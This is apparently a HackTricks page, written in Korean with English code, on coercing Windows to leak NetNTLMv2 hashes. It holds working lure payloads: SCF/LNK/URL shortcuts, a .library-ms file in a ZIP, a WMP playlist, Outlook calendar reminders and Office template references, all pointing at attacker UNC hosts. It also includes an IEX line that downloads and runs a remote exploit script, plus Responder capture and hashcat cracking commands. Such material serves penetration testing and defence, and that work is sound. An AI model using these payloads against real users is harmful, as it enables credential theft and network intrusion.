# NTLM creds를 훔칠 장소

{{#include ../../banners/hacktricks-training.md}}

**아래의 훌륭한 아이디어들을 모두 확인하세요: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — 온라인에서 microsoft word 파일을 다운로드하는 것부터 ntlm leaks 소스: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 및 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### 쓰기 가능한 SMB 공유 + Explorer로 트리거되는 UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

사용자나 예약 작업이 Explorer에서 탐색하는 공유에 **쓰기할 수 있다면**, 메타데이터가 당신의 UNC(예: `\\ATTACKER\share`)를 가리키는 파일을 배치하세요. 폴더를 렌더링하면 **implicit SMB authentication**이 트리거되어 **NetNTLMv2**가 당신의 리스너로 leaks 됩니다.

1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **쓰기 가능한 공유 폴더에 놓기** (피해자가 여는 임의의 폴더):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows는 한 번에 여러 파일을 참조할 수 있습니다. Explorer가 미리 보는 항목(`BROWSE TO FOLDER`)은 클릭이 필요 없습니다.

### Windows Media Player 재생 목록 (.ASX/.WAX)

대상에게 사용자가 제어하는 Windows Media Player 재생 목록을 열거나 미리 보기하도록 유도할 수 있다면, 항목을 UNC path로 지정하여 Net‑NTLMv2를 leak할 수 있습니다. WMP는 참조된 미디어를 SMB를 통해 가져오려고 시도하며 암묵적으로 인증합니다.

예제 페이로드:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
수집 및 cracking 흐름:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP에 포함된 .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer는 ZIP 아카이브 내부에서 직접 열릴 때 .library-ms 파일을 안전하지 않게 처리합니다. 라이브러리 정의가 원격 UNC 경로(예: \\attacker\share)를 가리키면, ZIP 내부에서 .library-ms를 단순히 탐색/실행하는 것만으로 Explorer가 해당 UNC를 열거하고 공격자에게 NTLM 인증을 전송합니다. 이로 인해 NetNTLMv2가 생성되며, 이는 오프라인으로 크랙하거나 잠재적으로 relayed할 수 있습니다.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- .library-ms 파일을 위의 XML로 생성합니다 (IP/호스트명 설정).
- 이를 ZIP으로 압축(Windows: Send to → Compressed (zipped) folder)하여 대상에 전달합니다.
- NTLM capture listener를 실행하고 피해자가 ZIP 내부에서 .library-ms를 열 때까지 대기합니다.


### Outlook calendar reminder sound path (CVE-2023-23397) – 제로 클릭 Net‑NTLMv2 leak

Microsoft Outlook for Windows는 캘린더 항목에서 확장 MAPI 속성 PidLidReminderFileParameter를 처리했습니다. 해당 속성이 UNC 경로(예: \\attacker\share\alert.wav)를 가리키면, 리마인더가 작동할 때 Outlook은 SMB share에 접속하여 사용자의 Net‑NTLMv2를 아무런 클릭 없이 leak합니다. 이는 2023년 3월 14일에 패치되었지만, 레거시/미패치 환경과 과거 사고 대응에는 여전히 매우 중요합니다.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
리스너 측:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 피해자는 알림이 발생할 때 Outlook for Windows만 실행 중이면 된다.
- 이 leak은 Net‑NTLMv2를 생성하며 offline cracking 또는 relay에 적합하다 (not pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer는 바로가기 아이콘을 자동으로 렌더링한다. 최근 연구에 따르면 Microsoft의 2025년 4월 UNC‑icon shortcuts 패치 이후에도, 바로가기 대상(target)을 UNC 경로에 호스팅하고 아이콘을 로컬에 유지하면 클릭 없이 NTLM 인증을 트리거할 수 있었다(패치 우회에 CVE‑2025‑50154가 할당됨). 단순히 폴더를 보는 것만으로 Explorer가 원격 대상에서 메타데이터를 가져와 NTLM을 공격자 SMB 서버로 전송한다.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell을 통한 프로그램 바로가기 payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- 바로가기(shortcut)를 ZIP에 넣어 피해자가 탐색하도록 유도합니다.
- 피해자가 열 가능성이 있는 쓰기 가능한 공유(writable share)에 바로가기를 둡니다.
- 같은 폴더에 다른 유인 파일들과 함께 배치하여 Explorer가 항목을 미리보기(preview)하도록 만듭니다.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows는 `.lnk` 메타데이터를 실행 시뿐만 아니라 **view/preview**(아이콘 렌더링) 중에도 로드합니다. CVE‑2026‑25185는 **ExtraData** 블록이 셸로 하여금 아이콘 경로를 해석하고 파일시스템에 접근하도록 만드는 파싱 경로를 보여주며, 해당 경로가 원격일 경우 아웃바운드 NTLM 인증을 발생시킵니다.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (아이콘 업데이트 루틴으로 가는 게이트).
- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
- The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 문서는 외부 템플릿을 참조할 수 있습니다. 첨부된 템플릿을 UNC 경로로 설정하면 문서를 열 때 SMB로 인증이 발생합니다.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels 파일을 편집하여 rId1337을 자신의 UNC로 지정하세요:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx로 재패키징하여 전달하세요. SMB capture listener를 실행하고 open을 기다리세요.

포스트 캡처 후 relaying 또는 abusing NTLM에 대한 아이디어는 다음을 확인하세요:

{{#ref}}
README.md
{{#endref}}


## 참고자료
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
